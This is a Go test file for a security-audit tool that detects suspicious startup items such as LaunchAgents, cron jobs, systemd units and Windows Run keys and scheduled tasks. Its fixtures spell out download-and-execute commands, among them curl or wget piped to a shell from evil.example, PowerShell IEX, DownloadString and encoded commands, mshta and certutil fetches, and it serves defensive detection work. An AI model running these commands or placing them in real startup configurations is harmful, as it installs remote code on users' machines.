package checks

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/ptrinh/bordercheck/internal/check"
	"github.com/ptrinh/bordercheck/internal/msg"
	"github.com/ptrinh/bordercheck/internal/policy"
)

const sampleLaunchAgent = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key><string>com.example.helper</string>
	<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string>
	<string>curl -fsSL https://evil.example/x.sh | bash</string></array>
	<key>RunAtLoad</key><true/>
</dict>
</plist>`

func TestLaunchdItem(t *testing.T) {
	it, ok := launchdItem(sampleLaunchAgent, "LaunchAgent", "~/Library/LaunchAgents/com.example.helper.plist")
	if !ok || it.Label != "com.example.helper" || it.Program != "/bin/sh" || !startupDownloads(it.Command) {
		t.Errorf("got %+v", it)
	}
	disabled := strings.Replace(sampleLaunchAgent, "<key>RunAtLoad</key>", "<key>Disabled</key><true/><key>RunAtLoad</key>", 1)
	if _, ok := launchdItem(disabled, "LaunchAgent", "x"); ok {
		t.Error("a disabled item counted")
	}
	prog := `<plist version="1.0"><dict><key>Label</key><string>a</string><key>Program</key><string>/Applications/A.app/Contents/MacOS/a</string></dict></plist>`
	if it, ok := launchdItem(prog, "LaunchDaemon", "/Library/LaunchDaemons/a.plist"); !ok || it.Program != "/Applications/A.app/Contents/MacOS/a" {
		t.Errorf("Program key: %+v", it)
	}
}

func TestStartupDownloads(t *testing.T) {
	yes := []string{
		"/bin/bash -c 'curl -s https://x.example/i.sh | sh'",
		"sh -c \"$(curl -fsSL https://x.example/install)\"",
		"wget -qO- http://x.example/a | sudo bash",
		"curl https://x.example/p.py | python3",
		"echo aGVsbG8= | base64 --decode | bash",
		`"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA`,
		`powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')"`,
		`powershell -c "iwr http://x.example/a | iex"`,
		`mshta https://x.example/a.hta`,
		`certutil.exe -urlcache -split -f http://x.example/a.exe a.exe`,
	}
	for _, c := range yes {
		if !startupDownloads(c) {
			t.Errorf("missed %q", c)
		}
	}
	no := []string{
		"/usr/local/bin/ollama serve",
		"/bin/sh -c 'curl -s https://x.example/health > /dev/null'",
		`"C:\Program Files\App\app.exe" --minimized`,
		"/usr/bin/python3 /Users/demo/bin/backup.py --encode",
		`powershell -ExecutionPolicy Bypass -File C:\Scripts\login.ps1`,
	}
	for _, c := range no {
		if startupDownloads(c) {
			t.Errorf("flagged %q", c)
		}
	}
}

func TestStartupSuspiciousPlace(t *testing.T) {
	mac := startupEnv{home: "/Users/demo", goos: "darwin", extra: []string{"/Users/demo/Public"}}
	for p, want := range map[string]string{
		"/tmp/x":                           "temporary",
		"/private/var/tmp/a/b":             "temporary",
		"/Users/Shared/.hidden/agent":      "/Users/Shared",
		"/Users/demo/Downloads/setup":      "Downloads",
		"/Users/demo/.x1/agent":            "hidden folder in home (~/.x1)",
		"/Users/demo/Public/a":             "/Users/demo/Public",
		"/Users/demo/.local/bin/tool":      "",
		"/Users/demo/.cargo/bin/x":         "",
		"/Users/demo/.zshrc":               "", // a file directly in home is not "in a hidden folder"
		"/Applications/Foo.app/Contents/x": "",
		"/usr/local/bin/x":                 "",
		"node":                             "",
	} {
		if got := mac.suspiciousPlace(p); (want == "") != (got == "") || !strings.Contains(got, want) {
			t.Errorf("%s: got %q, want %q", p, got, want)
		}
	}
	win := startupEnv{home: `C:\Users\demo`, goos: "windows", tempDir: `C:\Users\demo\AppData\Local\Temp`}
	for p, want := range map[string]string{
		`C:\Users\demo\AppData\Local\Temp\x.exe`:      "temporary",
		`c:\windows\temp\a.exe`:                       "temporary",
		`C:\Users\demo\Downloads\a.exe`:               "Downloads",
		`C:\Users\demo\.cache2\a.exe`:                 "hidden folder",
		`C:\Users\demo\AppData\Roaming\Zoom\Zoom.exe`: "",
		`C:\Program Files\App\app.exe`:                "",
	} {
		if got := win.suspiciousPlace(p); (want == "") != (got == "") || !strings.Contains(got, want) {
			t.Errorf("%s: got %q, want %q", p, got, want)
		}
	}
}

func TestSplitCommandAndPrograms(t *testing.T) {
	if got := splitCommand(`/bin/sh -c "echo 'a b'" x\ y`, false); strings.Join(got, "|") != `/bin/sh|-c|echo 'a b'|x y` {
		t.Errorf("unix: %q", got)
	}
	for in, want := range map[string]string{
		`"C:\Program Files\App\app.exe" --x`:   `C:\Program Files\App\app.exe`,
		`C:\Program Files\App\app.exe --x`:     `C:\Program Files\App\app.exe`,
		`rundll32.exe shell32.dll,Control_Run`: `rundll32.exe`,
		`C:\Tools\run.bat`:                     `C:\Tools\run.bat`,
	} {
		if got := windowsProgram(in); got != want {
			t.Errorf("%s: got %q", in, got)
		}
	}
	env := func(k string) string { return map[string]string{"LOCALAPPDATA": `C:\Users\demo\AppData\Local`}[k] }
	if got := expandWinEnv(`%LOCALAPPDATA%\x\%UNKNOWN%\y.exe 50%`, env); got != `C:\Users\demo\AppData\Local\x\%UNKNOWN%\y.exe 50%` {
		t.Errorf("expand: %q", got)
	}
	it := commandItem("autostart", "x", "x", "env FOO=1 python3 /tmp/payload.py --flag")
	if it.Program != "python3" || startupScript(it, false) != "/tmp/payload.py" {
		t.Errorf("command item: %+v %q", it, startupScript(it, false))
	}
}

func TestDesktopSystemdCron(t *testing.T) {
	if it, ok := desktopItem("[Desktop Entry]\nType=Application\nName=Sync\nExec=/home/demo/.sync/bin/agent --tray %U\n", "~/.config/autostart/sync.desktop"); !ok ||
		it.Program != "/home/demo/.sync/bin/agent" || it.Label != "sync" {
		t.Errorf("desktop: %+v", it)
	}
	if _, ok := desktopItem("[Desktop Entry]\nExec=/usr/bin/x\nHidden=true\n", "x.desktop"); ok {
		t.Error("hidden entry counted")
	}
	if _, ok := desktopItem("[Desktop Entry]\nExec=/usr/bin/x\nX-GNOME-Autostart-enabled=false\n", "x.desktop"); ok {
		t.Error("disabled entry counted")
	}
	if got := systemdExec("[Service]\nType=oneshot\nExecStart=-/usr/bin/foo --bar\nExecStart=/second\n"); got != "/usr/bin/foo --bar" {
		t.Errorf("systemd: %q", got)
	}
	tab := "# m h dom mon dow command\nMAILTO=\"\"\nSHELL=/bin/bash\n*/5 * * * * curl -s https://x.example/a | sh\n" +
		"@reboot /home/demo/.local/bin/tool --serve\n17 * * * * '/opt/bordercheck/bordercheck' send # bordercheck: hourly report (bordercheck uninstall removes this line)\n"
	items := cronItems(tab)
	if len(items) != 3 || !startupDownloads(items[0].Command) || items[0].Label != "line 4" ||
		items[1].Program != "/home/demo/.local/bin/tool" || !items[2].Own || items[2].Program != "/opt/bordercheck/bordercheck" {
		t.Errorf("cron: %+v", items)
	}
}

func TestWinStartupItems(t *testing.T) {
	out := "run\tHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\tUpdater\t%TEMP%\\upd.exe /silent\r\n" +
		"run\tHKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\tSecurityHealth\t%windir%\\system32\\SecurityHealthSystray.exe\r\n" +
		"folder\tC:\\Users\\demo\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\tnotes.lnk\t\"C:\\Program Files\\Notes\\notes.exe\" \r\n" +
		"task\t\\\tbordercheck\t\"C:\\Users\\demo\\AppData\\Local\\bordercheck\\bordercheck.exe\" send\r\n" +
		"task\t\\\tUpdaterTask\t\"powershell.exe\" -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\r\n" +
		"junk line\r\n"
	env := func(k string) string {
		return map[string]string{"TEMP": `C:\Users\demo\AppData\Local\Temp`, "windir": `C:\Windows`}[k]
	}
	items := winStartupItems(out, env)
	if len(items) != 5 || items[0].Program != `C:\Users\demo\AppData\Local\Temp\upd.exe` || items[0].Source != "Run key" ||
		items[2].Program != `C:\Program Files\Notes\notes.exe` || !items[3].Own || items[4].Own {
		t.Fatalf("got %+v", items)
	}
	e := startupEnv{home: `C:\Users\demo`, goos: "windows", tempDir: `C:\Users\demo\AppData\Local\Temp`}
	r := evalStartup(items, nil, e, msg.Of("startup.fix.win"))
	ev := strings.Join(r.Evidence, "\n")
	if r.Status != check.Fail || r.Severity != check.High || len(r.Evidence) != 2 || !strings.Contains(ev, "UpdaterTask") ||
		!strings.Contains(ev, `upd.exe  starts from a temporary folder`) || !strings.Contains(r.Summary, "4 items start") ||
		strings.Contains(ev, "SQBFAF") || strings.Contains(ev, "/silent") {
		t.Errorf("got %s %s %q\n%s", r.Status, r.Severity, r.Summary, ev)
	}
}

func TestEvalStartup(t *testing.T) {
	home := "/Users/demo"
	e := newStartupEnv(home, "darwin", policy.Default().Checks.StartupItems)
	items := []startupItem{
		{Source: "LaunchAgent", Where: "~/Library/LaunchAgents/io.github.ptrinh.bordercheck.plist", Label: "io.github.ptrinh.bordercheck",
			Program: "/tmp/bordercheck", Own: true}, // never flagged, never counted
		{Source: "LaunchAgent", Where: "~/Library/LaunchAgents/com.a.plist", Label: "com.a", Program: "/Applications/A.app/Contents/MacOS/a"},
		{Source: "LaunchAgent", Where: "~/Library/LaunchAgents/com.b.plist", Label: "com.b", Program: "/Users/demo/Library/b/b", Missing: true},
		{Source: "LaunchDaemon", Where: "/Library/LaunchDaemons/com.c.plist", Label: "com.c", Program: "/usr/local/c", Writable: true},
		{Source: "LaunchAgent", Where: "~/Library/LaunchAgents/com.d.plist", Label: "com.d", Program: "/usr/bin/python3",
			Command: "/usr/bin/python3 /Users/Shared/d.py --token abc"},
	}
	r := evalStartup(items, nil, e, startupFix("darwin"))
	ev := strings.Join(r.Evidence, "\n")
	if r.Status != check.Warn || r.Severity != check.Medium || len(r.Evidence) != 3 ||
		!strings.Contains(ev, "LaunchAgent ~/Library/LaunchAgents/com.d.plist (com.d): /Users/Shared/d.py  starts from /Users/Shared") ||
		!strings.Contains(ev, "/usr/local/c  the program or its folder can be changed by any user") ||
		!strings.Contains(ev, "~/Library/b/b  the program no longer exists") || strings.Contains(ev, "abc") ||
		!strings.Contains(r.Summary, "4 items start at login or on a schedule in all") || strings.Contains(ev, "bordercheck") {
		t.Errorf("got %s %s %q\n%s", r.Status, r.Severity, r.Summary, ev)
	}
	// Allowed by label or by path.
	p := policy.Default().Checks.StartupItems
	p.Allow = []string{"com.d", "/usr/local/*", "~/Library/b/**"}
	r = evalStartup(items, nil, newStartupEnv(home, "darwin", p), startupFix("darwin"))
	if r.Status != check.Pass || r.Summary != "4 items start at login or on a schedule; nothing unusual." {
		t.Errorf("allowed: %s %q %v", r.Status, r.Summary, r.Evidence)
	}
	// Only missing programs: low.
	r = evalStartup(items[2:3], nil, e, startupFix("darwin"))
	if r.Status != check.Warn || r.Severity != check.Low {
		t.Errorf("missing only: %s %s", r.Status, r.Severity)
	}
}

func TestStatStartup(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("permission bits")
	}
	dir := t.TempDir()
	ok := filepath.Join(dir, "ok")
	open := filepath.Join(dir, "open")
	for _, p := range []string{ok, open} {
		if err := os.WriteFile(p, []byte("#!/bin/sh\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	if err := os.Chmod(open, 0o777); err != nil {
		t.Fatal(err)
	}
	items := []startupItem{{Program: ok}, {Program: open}, {Program: filepath.Join(dir, "gone")}, {Program: "node"}}
	statStartup(items, "/nonexistent-home", "linux")
	if items[0].Missing || items[0].Writable || !items[1].Writable || !items[2].Missing || items[3].Missing {
		t.Errorf("got %+v", items)
	}
	// On macOS, folders that prompt are never touched. Which folders those are
	// is decided for the OS this runs on (sshPathAvoided), so the home-folder
	// ones can only be tried on a Mac; /Volumes is refused by name everywhere.
	items = []startupItem{{Program: "/Volumes/NAS/x"}}
	if runtime.GOOS == "darwin" {
		items = append(items, startupItem{Program: "/Users/demo/Documents/x"}, startupItem{Program: "/Users/demo/Library/Containers/x/y"})
	}
	statStartup(items, "/Users/demo", "darwin")
	for _, it := range items {
		if it.Missing {
			t.Errorf("%s was looked at", it.Program)
		}
	}
	if startupAvoided("/Users/demo", "darwin", "/Users/demo/Library/Application Support/x") {
		t.Error("Application Support avoided")
	}
}
